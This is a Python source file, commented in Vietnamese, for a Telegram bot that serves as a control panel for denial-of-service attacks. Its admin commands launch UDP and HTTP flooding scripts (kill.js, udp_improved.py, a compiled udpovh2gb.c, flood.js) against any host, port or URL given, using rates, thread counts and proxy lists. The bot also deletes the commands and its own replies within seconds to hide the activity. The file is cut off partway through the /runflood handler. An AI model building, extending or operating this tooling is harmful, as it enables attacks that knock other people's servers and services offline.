import os
import sys
import time
import signal
import threading
import logging
import subprocess
import sqlite3
import platform
from datetime import datetime, timezone
from contextlib import contextmanager
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
from functools import wraps

from telebot import TeleBot, types
from telebot.apihelper import ApiException

# ========== Config và token ==========

TELEGRAM_TOKEN_FILE = 'bot_token.txt'

def check_dependencies():
    """Kiểm tra các dependencies cần thiết"""
    missing_deps = []
    
    # Kiểm tra Node.js
    try:
        subprocess.run(['node', '--version'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        missing_deps.append('Node.js')
    
    # Kiểm tra Python
    try:
        subprocess.run(['python', '--version'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            subprocess.run(['python3', '--version'], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            missing_deps.append('Python')
    
    # Kiểm tra GCC (chỉ trên Linux/Unix)
    if os.name != 'nt':
        try:
            subprocess.run(['gcc', '--version'], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            missing_deps.append('GCC')
    
    if missing_deps:
        logger.warning(f"⚠️ Missing dependencies: {', '.join(missing_deps)}")
        logger.warning("Some features may not work properly.")
    else:
        logger.info("✅ All dependencies are available")

def load_bot_token():
    try:
        with open(TELEGRAM_TOKEN_FILE, 'r', encoding='utf-8') as f:
            token = f.read().strip()
            if not token:
                raise ValueError("Token file is empty!")
            logger.info("Loaded Telegram bot token from file.")
            return token
    except Exception as e:
        print(f"❌ Error reading bot token from file '{TELEGRAM_TOKEN_FILE}': {e}")
        sys.exit(f"❌ Bot token file '{TELEGRAM_TOKEN_FILE}' not found or invalid. Please create it with your bot token.")

@dataclass
class Config:
    TOKEN: str = None
    ADMIN_PASSWORD: str = 'your_secure_password'
    DATABASE: str = 'bot_data_v3.db'
    MAX_MESSAGE_LENGTH: int = 4000
    RETRY_DELAY: int = 10

# ========== Logging config ==========

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

Config.TOKEN = load_bot_token()
bot = TeleBot(Config.TOKEN)

bot_start_time = datetime.now(timezone.utc)

# ========== Database Manager ==========

db_lock = threading.Lock()

class DatabaseManager:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.init_database()

    @contextmanager
    def get_connection(self):
        conn = None
        try:
            with db_lock:
                conn = sqlite3.connect(self.db_path, check_same_thread=False)
                conn.row_factory = sqlite3.Row
                yield conn
                conn.commit()
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            if conn:
                conn.rollback()
            raise
        finally:
            if conn:
                conn.close()

    def init_database(self):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    is_admin INTEGER DEFAULT 0,
                    is_banned INTEGER DEFAULT 0,
                    join_date TEXT DEFAULT CURRENT_TIMESTAMP,
                    last_active TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated_at TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS activity_logs (
                    log_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    action TEXT,
                    details TEXT,
                    timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id)
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS used_tokens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    token TEXT UNIQUE,
                    first_used TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')

            default_settings = [
                ('welcome_message', '🌟 Chào mừng bạn đến với Bot!\n\nSử dụng /help để xem hướng dẫn.'),
                ('admin_password', Config.ADMIN_PASSWORD),
                ('maintenance_mode', '0')
            ]
            for k, v in default_settings:
                cursor.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', (k, v))

    def get_setting(self, key: str):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT value FROM settings WHERE key=?', (key,))
            row = cursor.fetchone()
            return row['value'] if row else None

    def set_setting(self, key: str, value: str):
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('INSERT OR REPLACE INTO settings (key,value,updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)', (key, value))
            return True
        except Exception as e:
            logger.error(f"Error setting {key}: {e}")
            return False

    def save_user(self, user):
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO users(user_id, username, first_name, last_name)
                    VALUES (?, ?, ?, ?)
                    ON CONFLICT(user_id) DO UPDATE SET
                        username=excluded.username,
                        first_name=excluded.first_name,
                        last_name=excluded.last_name,
                        last_active=CURRENT_TIMESTAMP
                ''', (user.id, getattr(user, 'username', None), getattr(user, 'first_name', None), getattr(user, 'last_name', None)))
            return True
        except Exception as e:
            logger.error(f"Error saving user: {e}")
            return False

    def is_admin(self, user_id: int) -> bool:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT is_admin FROM users WHERE user_id=?', (user_id,))
            row = cursor.fetchone()
            return bool(row and row['is_admin'] == 1)

    def is_banned(self, user_id: int) -> bool:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT is_banned FROM users WHERE user_id=?', (user_id,))
            row = cursor.fetchone()
            return bool(row and row['is_banned'] == 1)

    def log_activity(self, user_id: int, action: str, details: str=None):
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('INSERT INTO activity_logs(user_id, action, details) VALUES (?, ?, ?)', (user_id, action, details))
        except Exception as e:
            logger.error(f"Error logging activity: {e}")

    def save_token(self, token: str):
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('INSERT OR IGNORE INTO used_tokens(token) VALUES (?)', (token,))
            return True
        except Exception as e:
            logger.error(f"Error saving token: {e}")
            return False

    def is_token_used(self, token: str) -> bool:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT 1 FROM used_tokens WHERE token=? LIMIT 1', (token,))
            return cursor.fetchone() is not None

    def add_admin(self, user_id: int) -> bool:
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM users WHERE user_id=?', (user_id,))
                user = cursor.fetchone()
                if user:
                    cursor.execute('UPDATE users SET is_admin=1 WHERE user_id=?', (user_id,))
                else:
                    cursor.execute('INSERT INTO users(user_id, is_admin) VALUES (?, 1)', (user_id,))
            return True
        except Exception as e:
            logger.error(f"Error adding admin rights to user {user_id}: {e}")
            return False

db = DatabaseManager(Config.DATABASE)

if not db.is_token_used(Config.TOKEN):
    db.save_token(Config.TOKEN)
    logger.info("Lần đầu sử dụng token bot này, đã lưu token vào database.")
else:
    logger.info("Bot token đã từng được kết nối trước đây.")

# ========== Admin session cache ==========

admin_session_cache = set()

def refresh_admin_session(user_id):
    if db.is_admin(user_id):
        admin_session_cache.add(user_id)
    else:
        admin_session_cache.discard(user_id)

# ========== Decorators ==========

def ignore_old_messages(func):
    @wraps(func)
    def wrapper(message):
        msg_date = datetime.fromtimestamp(message.date, tz=timezone.utc)
        if msg_date < bot_start_time:
            logger.info(f"Ignored old message from user {message.from_user.id} sent at {msg_date}")
            return
        return func(message)
    return wrapper

def admin_required(func):
    @wraps(func)
    def wrapper(message):
        uid = message.from_user.id
        if uid not in admin_session_cache:
            refresh_admin_session(uid)
        if uid not in admin_session_cache:
            sent = bot.reply_to(message, "❌ Bạn không có quyền sử dụng lệnh này!")
            delete_messages_later(message.chat.id, [message.message_id, sent.message_id], delay=30)
            db.log_activity(uid, "UNAUTHORIZED_ACCESS", f"Cmd: {message.text}")
            return
        return func(message)
    return wrapper

def not_banned(func):
    @wraps(func)
    def wrapper(message):
        if db.is_banned(message.from_user.id):
            sent = bot.reply_to(message, "⛔ Bạn đã bị cấm sử dụng bot!")
            delete_messages_later(message.chat.id, [message.message_id, sent.message_id], delay=30)
            return
        return func(message)
    return wrapper

def log_command(func):
    @wraps(func)
    def wrapper(message):
        db.log_activity(message.from_user.id, "COMMAND", message.text[:100])
        return func(message)
    return wrapper

# ========== Quản lý subprocess ==========

running_tasks = {}
executor = ThreadPoolExecutor(max_workers=5)

def run_subprocess_async(command_list, user_id, chat_id, task_key, message):
    key = (user_id, chat_id, task_key)
    proc = running_tasks.get(key)
    if proc and proc.poll() is None:
        sent = bot.reply_to(message, f"❌ Tác vụ `{task_key}` đang chạy rồi.")
        auto_delete_response(chat_id, message.message_id, sent, delay=10)
        return

    def task():
        try:
            # Use different approach for Windows vs Unix
            if os.name == 'nt':  # Windows
                proc_local = subprocess.Popen(command_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
            else:  # Unix/Linux
                proc_local = subprocess.Popen(command_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
            running_tasks[key] = proc_local
            start_msg = bot.send_message(chat_id, f"✅ Bắt đầu chạy tác vụ `{task_key}`:\n`{' '.join(command_list)}`", parse_mode='Markdown')
            # Tự động xóa thông báo bắt đầu sau 15 giây
            auto_delete_response(chat_id, message.message_id, start_msg, delay=15)
            
            stdout, stderr = proc_local.communicate()
            output = stdout.decode(errors='ignore').strip()
            errors = stderr.decode(errors='ignore').strip()
            
            if output:
                if len(output) > Config.MAX_MESSAGE_LENGTH:
                    output = output[:Config.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
                result_msg = bot.send_message(chat_id, f"📢 Kết quả tác vụ `{task_key}`:\n{output}")
                # Tự động xóa kết quả sau 30 giây
                auto_delete_response(chat_id, message.message_id, result_msg, delay=30)
            
            if errors:
                if len(errors) > Config.MAX_MESSAGE_LENGTH:
                    errors = errors[:Config.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
                error_msg = bot.send_message(chat_id, f"❗ Lỗi:\n{errors}")
                # Tự động xóa lỗi sau 20 giây
                auto_delete_response(chat_id, message.message_id, error_msg, delay=20)
        except Exception as e:
            logger.error(f"Lỗi chạy tác vụ {task_key}: {e}")
            error_msg = bot.send_message(chat_id, f"❌ Lỗi tác vụ `{task_key}`: {e}")
            # Tự động xóa lỗi sau 20 giây
            auto_delete_response(chat_id, message.message_id, error_msg, delay=20)
        finally:
            running_tasks[key] = None

    executor.submit(task)

def stop_subprocess(user_id, chat_id, task_key, message):
    key = (user_id, chat_id, task_key)
    proc = running_tasks.get(key)
    if proc and proc.poll() is None:
        try:
            if os.name == 'nt':  # Windows
                proc.terminate()
                proc.wait(timeout=5)  # Wait up to 5 seconds for graceful shutdown
            else:  # Unix/Linux
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            running_tasks[key] = None
            sent = bot.reply_to(message, f"✅ Đã dừng tác vụ `{task_key}` thành công.")
            auto_delete_response(chat_id, message.message_id, sent, delay=10)
            logger.info(f"User {user_id} chat {chat_id} đã dừng tác vụ {task_key}")
        except Exception as e:
            sent = bot.reply_to(message, f"❌ Lỗi khi dừng tác vụ `{task_key}`: {e}")
            auto_delete_response(chat_id, message.message_id, sent, delay=15)
            logger.error(f"Lỗi dừng tác vụ {task_key}: {e}")
    else:
        sent = bot.reply_to(message, f"ℹ️ Không có tác vụ `{task_key}` nào đang chạy.")
        auto_delete_response(chat_id, message.message_id, sent, delay=10)

# ========== Tiện ích ==========

def delete_messages_later(chat_id, message_ids, delay=30):
    def delete_msgs():
        for msg_id in message_ids:
            try:
                bot.delete_message(chat_id, msg_id)
                logger.debug(f"Deleted message {msg_id} in chat {chat_id}")
            except Exception as e:
                logger.warning(f"Cannot delete message {msg_id} in chat {chat_id}: {e}")
    threading.Timer(delay, delete_msgs).start()

def delete_message_immediately(chat_id, message_id):
    """Xóa tin nhắn ngay lập tức"""
    try:
        bot.delete_message(chat_id, message_id)
        logger.debug(f"Immediately deleted message {message_id} in chat {chat_id}")
    except Exception as e:
        logger.warning(f"Cannot immediately delete message {message_id} in chat {chat_id}: {e}")

def auto_delete_response(chat_id, message_id, response_message, delay=10):
    """Tự động xóa tin nhắn bot trả lời sau một khoảng thời gian"""
    def delete_response():
        try:
            bot.delete_message(chat_id, response_message.message_id)
            logger.debug(f"Auto-deleted response message {response_message.message_id} in chat {chat_id}")
        except Exception as e:
            logger.warning(f"Cannot auto-delete response message {response_message.message_id} in chat {chat_id}: {e}")
    threading.Timer(delay, delete_response).start()

def create_menu(user_id: int) -> types.ReplyKeyboardMarkup:
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    if user_id in admin_session_cache:
        markup.row("📋 Danh sách nhóm", "📊 Thống kê")
        markup.row("➕ Thêm nhóm", "❌ Xóa nhóm")
        markup.row("⚙️ Cài đặt", "📢 Thông báo")
        markup.row("👥 Quản lý users", "📝 Logs")
        markup.row("🔧 Tools hệ thống", "🆘 Trợ giúp")
    else:
        markup.row("📋 Danh sách nhóm", "📊 Thống tin")
        markup.row("🆘 Trợ giúp", "📞 Liên hệ")
    return markup

def get_uptime():
    if not hasattr(bot, 'start_time'):
        return "N/A"
    delta = datetime.now() - bot.start_time
    return f"{delta.days}d {delta.seconds // 3600}h {(delta.seconds % 3600) // 60}m"

def escape_markdown_v2(text: str) -> str:
    escape_chars = r'\_*[]()~`>#+-=|{}.!'
    for ch in escape_chars:
        text = text.replace(ch, '\\' + ch)
    return text

# ========== Các lệnh bot ==========

@bot.message_handler(commands=['start'])
@ignore_old_messages
@not_banned
@log_command
def cmd_start(message):
    try:
        db.save_user(message.from_user)
        welcome = db.get_setting('welcome_message') or "Chào mừng bạn đến với Bot!"
        kb = create_menu(message.from_user.id)
        sent = bot.send_message(message.chat.id, welcome, reply_markup=kb, parse_mode='Markdown')
        # Không tự động xóa tin nhắn start vì cần hiển thị menu
        logger.info(f"User {message.from_user.id} started the bot")
    except Exception as e:
        logger.error(f"Error in /start: {e}")
        sent = bot.reply_to(message, "❌ Có lỗi xảy ra, vui lòng thử lại sau!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['help'])
@ignore_old_messages
@not_banned
@log_command
def cmd_help(message):
    try:
        is_admin = message.from_user.id in admin_session_cache or db.is_admin(message.from_user.id)
        if message.from_user.id not in admin_session_cache and is_admin:
            admin_session_cache.add(message.from_user.id)
        help_text = (
            "🤖 *HƯỚNG DẪN SỬ DỤNG BOT*\n"
            "📌 *Lệnh cơ bản:*\n"
            "/start - Khởi động bot\n"
            "/help - Hiển thị trợ giúp\n"
            "/myid - Xem ID của bạn\n"
            "/stats - Thống kê bot\n"
        )
        if is_admin:
            help_text += (
                "\n👑 *Lệnh Admin:*\n"
                "/admin [password] - Đăng nhập admin\n"
                "/addadmin <user_id> - Cấp quyền admin cho người khác\n"
                "/runkill target time rate threads [proxyfile] - Chạy kill.js\n"
                "/runudp host port method - Chạy udp_improved.py\n"                
                "/runovh host port duration threads - Chạy udpovh2gb.c\n"
                "/runflood host time threads rate - Chạy flood.js\n"
                "/stopkill - Dừng kill.js\n"
                "/stopudp - Dừng udp_improved.py\n"
                "/stopflood - Dừng flood.js\n"
                "/scrapeproxies - Thu thập proxies\n"
                "/stopproxies - Dừng thu thập proxies\n"
                "/statuskill - Trạng thái kill.js\n"
                "/statusudp - Trạng thái udp_improved.py\n"
                "/statusflood - Trạng thái flood.js\n"
            )
        try:
            sent = bot.send_message(message.chat.id, escape_markdown_v2(help_text), parse_mode='MarkdownV2')
        except Exception as e:
            # Fallback to regular Markdown if MarkdownV2 fails
            logger.warning(f"MarkdownV2 failed, using regular Markdown: {e}")
            sent = bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, sent, delay=25)
    except Exception as e:
        logger.error(f"Error in /help: {e}")
        sent = bot.reply_to(message, "❌ Có lỗi xảy ra!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['admin'])
@ignore_old_messages
@not_banned
@log_command
def cmd_admin(message):
    try:
        # Xóa tin nhắn lệnh admin ngay lập tức để bảo mật
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split(maxsplit=1)
        if len(args) != 2:
            sent = bot.send_message(message.chat.id, "⚠️ Sử dụng: /admin [password]")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=5)
            return
        password = args[1].strip()
        correct_password = db.get_setting('admin_password')
        if password == correct_password:
            with db.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('UPDATE users SET is_admin=1 WHERE user_id=?', (message.from_user.id,))
            admin_session_cache.add(message.from_user.id)
            sent = bot.send_message(message.chat.id, "✅ Đăng nhập admin thành công!", reply_markup=create_menu(message.from_user.id))
            db.log_activity(message.from_user.id, "ADMIN_LOGIN", "Success")
            # Tự động xóa thông báo thành công sau 3 giây
            auto_delete_response(message.chat.id, message.message_id, sent, delay=3)
        else:
            sent = bot.send_message(message.chat.id, "❌ Mật khẩu không đúng!")
            db.log_activity(message.from_user.id, "ADMIN_LOGIN", "Failed")
            # Tự động xóa thông báo lỗi sau 5 giây
            auto_delete_response(message.chat.id, message.message_id, sent, delay=5)
    except Exception as e:
        logger.error(f"Error in /admin: {e}")
        sent = bot.reply_to(message, "❌ Có lỗi xảy ra!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=5)

@bot.message_handler(commands=['addadmin'])
@ignore_old_messages
@not_banned
@admin_required
def cmd_addadmin(message):
    # Xóa tin nhắn lệnh ngay lập tức để bảo mật
    delete_message_immediately(message.chat.id, message.message_id)
    
    args = message.text.strip().split()
    if len(args) != 2:
        sent = bot.reply_to(message, "⚠️ Cách dùng: /addadmin <user_id>\nVí dụ: /addadmin 123456789")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    try:
        new_admin_id = int(args[1])
    except ValueError:
        sent = bot.reply_to(message, "❌ User ID phải là số nguyên hợp lệ!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    if new_admin_id == message.from_user.id:
        sent = bot.reply_to(message, "⚠️ Bạn đã là admin!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    success = db.add_admin(new_admin_id)
    if success:
        admin_session_cache.add(new_admin_id)
        sent = bot.reply_to(message, f"✅ Đã cấp quyền admin cho user với ID: {new_admin_id}")
        db.log_activity(message.from_user.id, "ADD_ADMIN", f"Cấp admin cho user {new_admin_id}")
        # Tự động xóa thông báo thành công sau 8 giây
        auto_delete_response(message.chat.id, message.message_id, sent, delay=8)
    else:
        sent = bot.reply_to(message, "❌ Lỗi khi cấp quyền admin. Vui lòng thử lại!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['myid'])
@ignore_old_messages
@not_banned
def cmd_myid(message):
    sent = bot.reply_to(message, f"🆔 **ID của bạn:** `{message.from_user.id}`\n👤 **Username:** @{message.from_user.username or 'Không có'}", parse_mode='Markdown')
    auto_delete_response(message.chat.id, message.message_id, sent, delay=15)
    logger.info(f"User {message.from_user.id} requested their ID")

@bot.message_handler(commands=['stats'])
@ignore_old_messages
@not_banned
def cmd_stats(message):
    try:
        with db.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM users')
            total_users = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM users WHERE is_admin=1')
            total_admins = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM activity_logs WHERE date(timestamp) = date("now")')
            today_activities = cursor.fetchone()[0]
        uptime = get_uptime()
        stats_msg = (
            f"📊 **THỐNG KÊ BOT**\n"
            f"👥 Tổng users: {total_users}\n"
            f"👑 Admins: {total_admins}\n"
            f"📈 Hoạt động hôm nay: {today_activities}\n"
            f"⏰ Uptime: {uptime}"
        )
        sent = bot.send_message(message.chat.id, stats_msg, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, sent, delay=20)
        logger.info(f"User {message.from_user.id} requested stats")
    except Exception as e:
        logger.error(f"Error in /stats: {e}")
        sent = bot.reply_to(message, "❌ Không thể lấy thống kê!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runkill'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_runkill(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runkill...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split()
        if len(args) < 5 or len(args) > 6:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runkill target time rate threads [proxyfile]\n"
                "Ví dụ: /runkill https://example.com 60 100 4 proxies.txt\n"
                "Nếu không nhập proxyfile, bot sẽ tự động tìm file proxies.txt",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return
        target = args[1]
        duration = args[2]
        rate = args[3]
        threads = args[4]
        if len(args) == 6:
            proxyfile = args[5]
            if not os.path.isfile(proxyfile):
                bot.edit_message_text(f"❌ File proxy không tồn tại: {proxyfile}", 
                                    chat_id=message.chat.id, 
                                    message_id=processing_msg.message_id)
                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
                return
        else:
            # Tự động tìm file proxy phổ biến
            possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
            proxyfile = None
            for f in possible_files:
                if os.path.isfile(f):
                    proxyfile = f
                    break
            if proxyfile is None:
                bot.edit_message_text(
                    "❌ Không tìm thấy file proxy mặc định (proxies.txt). "
                    "Vui lòng cung cấp tên file proxy hoặc thêm file proxies.txt vào thư mục bot.",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                return
        cmd = ['node', 'kill.js', target, duration, rate, threads, proxyfile]
        logger.info(f"Running kill.js with args: {cmd}")
        
        # Cập nhật thông báo thành công
        bot.edit_message_text(
            f"✅ Lệnh /runkill đã được nhận!\n"
            f"🎯 Target: {target}\n"
            f"⏱️ Thời gian: {duration}s\n"
            f"📊 Rate: {rate}\n"
            f"🧵 Threads: {threads}\n"
            f"📁 Proxy: {proxyfile}\n\n"
            f"🔄 Đang khởi động tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'killjs', message)
    except Exception as e:
        logger.error(f"Error /runkill: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runkill: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runkill: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runudp'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_runudp(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runudp...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split()
        if len(args) != 4:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runudp host port method\n"
                "Phương thức: flood, nuke, mix, storm, pulse, random\n"
                "Ví dụ: /runudp 1.2.3.4 80 flood",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return
        _, host, port, method = args
        method = method.lower()
        if method not in ['flood', 'nuke', 'mix', 'storm', 'pulse', 'random']:
            bot.edit_message_text(
                "❌ Phương thức không hợp lệ. Chọn một trong: flood, nuke, mix, storm, pulse, random",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return
        
        # Use different approach for Windows vs Unix
        if os.name == 'nt':  # Windows
            cmd = ['python', 'udp_improved.py', host, port, method]
        else:  # Unix/Linux
            cmd = ['python3', 'udp_improved.py', host, port, method]
        
        # Cập nhật thông báo thành công
        bot.edit_message_text(
            f"✅ Lệnh /runudp đã được nhận!\n"
            f"🎯 Host: {host}\n"
            f"🔌 Port: {port}\n"
            f"⚡ Method: {method}\n\n"
            f"🔄 Đang khởi động tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'udp', message)
    except Exception as e:
        logger.error(f"Error /runudp: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runudp: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runudp: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)


@bot.message_handler(commands=['runovh'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_runovh(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runovh...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split()
        if len(args) != 5:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runovh host port duration threads\n"
                "Ví dụ: /runovh 1.2.3.4 80 60 8",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        _, host, port, duration, threads = args

        if not os.path.isfile('udpovh2gb'):
            if os.name == 'nt':  # Windows
                bot.edit_message_text(
                    "⚠️ Compilation not supported on Windows. Please compile udpovh2gb.c manually.",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                return
            else:  # Unix/Linux
                compile_cmd = ['gcc', 'udpovh2gb.c', '-o', 'udpovh2gb', '-lpthread']
                bot.edit_message_text(
                    "🔧 Đang compile udpovh2gb.c ...",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                compile_proc = subprocess.run(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if compile_proc.returncode != 0:
                    bot.edit_message_text(
                        f"❌ Lỗi compile udpovh2gb.c:\n{compile_proc.stderr.decode(errors='ignore')}",
                        chat_id=message.chat.id,
                        message_id=processing_msg.message_id
                    )
                    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                    return

        # Use different approach for Windows vs Unix
        if os.name == 'nt':  # Windows
            cmd = ['udpovh2gb.exe', host, port, duration, threads]  # Windows executable
        else:  # Unix/Linux
            cmd = ['./udpovh2gb', host, port, duration, threads]
        
        # Cập nhật thông báo thành công
        bot.edit_message_text(
            f"✅ Lệnh /runovh đã được nhận!\n"
            f"🎯 Host: {host}\n"
            f"🔌 Port: {port}\n"
            f"⏱️ Duration: {duration}s\n"
            f"🧵 Threads: {threads}\n\n"
            f"🔄 Đang khởi động tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'udpovh', message)
    except Exception as e:
        logger.error(f"Error /runovh: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi khi xử lý lệnh /runovh: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except:
            sent = bot.reply_to(message, f"❌ Có lỗi khi xử lý lệnh /runovh: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runflood'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_runflood(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runflood...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        # Phân tích tham số từ lệnh
        args = message.text.split()
        if len(args) != 5:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runflood <host> <time> <threads> <rate>",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        host = args[1]
        time = args[2]
        threads = args[3]
        rate = args[4]

        # Kiểm tra nếu không có proxyfile, tự động tìm file proxies.txt
        possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
        proxyfile = None
        for f in possible_files:
            if os.path.isfile(f):
                proxyfile = f
                break
        
        # Nếu không tìm thấy file proxy nào
        if proxyfile is None:
            bot.edit_message_text(
                "❌ Không tìm thấy file proxy (proxies.txt, proxy.txt, proxies.lst). Vui lòng cung cấp file proxy hợp lệ.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return
        
        # Các tham số mặc định sẽ được thêm vào
